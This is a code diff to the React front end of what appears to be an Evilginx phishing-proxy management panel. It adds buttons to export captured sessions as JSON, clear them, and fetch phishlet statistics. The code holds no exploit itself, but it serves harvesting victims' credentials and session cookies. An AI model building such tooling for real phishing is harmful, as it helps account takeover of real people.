@@ -91,6 +91,7 @@ import {
   Key,
   Mail,
   Image,
+  Download,
 } from "lucide-react";
 
 // ─── Types ───────────────────────────────────────────────────────
@@ -1165,6 +1166,10 @@ function SessionsTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
   const [raw, setRaw] = useState("");
   const [detailDialog, setDetailDialog] = useState<{ id: number; detail: string } | null>(null);
   const [deleteAllConfirm, setDeleteAllConfirm] = useState(false);
+  const exportSessions = trpc.evilginx.exportSessions.useMutation();
+  const clearSessions = trpc.evilginx.clearSessions.useMutation();
+  const getPhishletStats = trpc.evilginx.getPhishletStats.useMutation();
+  const [phishletStats, setPhishletStats] = useState<any>(null);
 
   const loadSessions = useCallback(async () => {
     setLoading(true);
@@ -1250,10 +1255,23 @@ function SessionsTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
             <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
           </Button>
           {sessions.length > 0 && (
-            <Button size="sm" variant="ghost" onClick={() => setDeleteAllConfirm(true)} className="text-red-400">
-              <Trash2 className="w-4 h-4 mr-1" /> Delete All
-            </Button>
+            <>
+              <Button size="sm" variant="outline" className="border-zinc-700 text-zinc-300 text-xs h-7" onClick={() => exportSessions.mutateAsync().then(r => {
+                const blob = new Blob([JSON.stringify(r.sessions, null, 2)], { type: "application/json" });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a"); a.href = url; a.download = "evilginx-sessions.json"; a.click();
+                toast.success(`Exported ${r.count} sessions`);
+              })} disabled={exportSessions.isPending}>
+                <Download className="w-3 h-3 mr-1" /> Export JSON
+              </Button>
+              <Button size="sm" variant="ghost" onClick={() => setDeleteAllConfirm(true)} className="text-red-400">
+                <Trash2 className="w-4 h-4 mr-1" /> Delete All
+              </Button>
+            </>
           )}
+          <Button size="sm" variant="outline" className="border-zinc-700 text-zinc-300 text-xs h-7" onClick={() => getPhishletStats.mutateAsync().then(r => setPhishletStats(r.stats))} disabled={getPhishletStats.isPending}>
+            Stats
+          </Button>
         </div>
       </div>
 
